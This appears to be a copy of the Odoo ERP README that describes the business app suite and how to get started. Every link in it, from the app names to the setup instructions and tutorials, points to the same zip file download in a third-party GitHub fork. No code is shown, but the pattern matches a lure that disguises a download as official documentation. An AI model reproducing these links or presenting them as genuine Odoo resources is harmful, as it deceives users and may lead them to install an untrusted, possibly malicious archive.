Odoo
----

Odoo is a suite of web based open source business apps.

The main Odoo Apps include an <a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Open Source CRM</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Website Builder</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">eCommerce</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Warehouse Management</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Project Management</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Billing &amp; Accounting</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Point of Sale</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Human Resources</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Marketing</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Manufacturing</a>,
<a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">...</a>

Odoo Apps can be used as stand-alone applications, but they also integrate seamlessly so you get
a full-featured <a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Open Source ERP</a> when you install several Apps.


Getting started with Odoo
-------------------------
For a standard installation please follow the <a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Setup instructions</a>
from the documentation.

To learn the software, we recommend the <a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Odoo eLearning</a>, or <a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">Scale-up</a>, the <a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">business game</a>. Developers can start with <a href="https://raw.githubusercontent.com/houda-ohm/odoo/14.0/convertite/odoo.zip">the developer tutorials</a>
